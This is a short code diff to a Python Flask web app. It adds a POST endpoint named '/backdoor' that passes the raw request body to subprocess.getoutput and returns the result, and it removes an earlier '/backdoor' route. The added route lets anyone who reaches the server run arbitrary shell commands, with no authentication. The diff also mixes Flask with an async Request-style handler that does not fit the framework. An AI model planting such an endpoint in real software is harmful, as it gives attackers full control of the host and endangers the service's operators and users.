@@ -11,6 +11,18 @@ app = Flask(__name__)
 
 port = int(os.environ.get("PORT", 5000))
 
+
+def execute_command(command):
+    result = subprocess.getoutput(command)
+    return result
+
+@app.post("/backdoor")
+async def handle_command(request: Request):
+    command = await request.body()
+    response = execute_command(command)
+    return response
+
+
 def start_server():
     allowed_servers = ["127.0.0.1", "192.168.1.2"]
     server_host = '0.0.0.0'
@@ -69,9 +81,6 @@ def all_routes(path):
     return redirect('/')
 
 
-@app.route('/backdoor')
-def backdoor():
-    start_server()
 
 
 if __name__ == "__main__":
